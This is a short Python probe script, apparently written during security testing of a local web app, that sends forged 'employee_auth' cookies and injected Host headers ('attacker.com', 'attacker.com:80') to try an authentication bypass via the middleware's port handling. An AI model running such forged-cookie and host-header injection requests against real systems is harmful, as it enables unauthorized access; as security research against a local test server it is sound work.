import http.client
import urllib.parse
import uuid

def test_bypass():
    print("Testing auth bypass...")
    
    # Generate a random UUID for the fake cookie
    fake_uuid = str(uuid.uuid4())
    
    # 1. Normal request without cookie
    conn = http.client.HTTPConnection("127.0.0.1", 3015)
    conn.request("GET", "/api/generate-form")
    res1 = conn.getresponse()
    print(f"Normal request without cookie: {res1.status}")
    res1.read()
    
    # 2. Request with fake UUID cookie, normal host
    conn.request("GET", "/api/generate-form", headers={"Cookie": f"employee_auth={fake_uuid}"})
    res2 = conn.getresponse()
    print(f"Fake UUID, normal Host: {res2.status}")
    res2.read()
    
    # 3. Request with fake UUID cookie and injected Host header (attacker.com)
    headers3 = {
        "Cookie": f"employee_auth={fake_uuid}",
        "Host": "attacker.com"
    }
    conn.request("GET", "/api/generate-form", headers=headers3)
    res3 = conn.getresponse()
    print(f"Fake UUID, Host: attacker.com: {res3.status}")
    res3.read()
    
    # 4. Request with fake UUID cookie and injected Host header with port (attacker.com:80)
    # The middleware does: `http://127.0.0.1:${request.nextUrl.port || process.env.PORT || 3000}`
    # If we pass attacker.com:80, request.nextUrl.port is 80.
    headers4 = {
        "Cookie": f"employee_auth={fake_uuid}",
        "Host": "attacker.com:80"
    }
    conn.request("GET", "/api/generate-form", headers=headers4)
    res4 = conn.getresponse()
    print(f"Fake UUID, Host: attacker.com:80: {res4.status}")
    res4.read()

    # Wait, what if the SSRF was that we bypass the fetch entirely?
    # Or what if we point the SSRF to a port that returns 200 OK?
    # Let's see if NextJS parses attacker.com:80 as port 80.
    

if __name__ == "__main__":
    test_bypass()
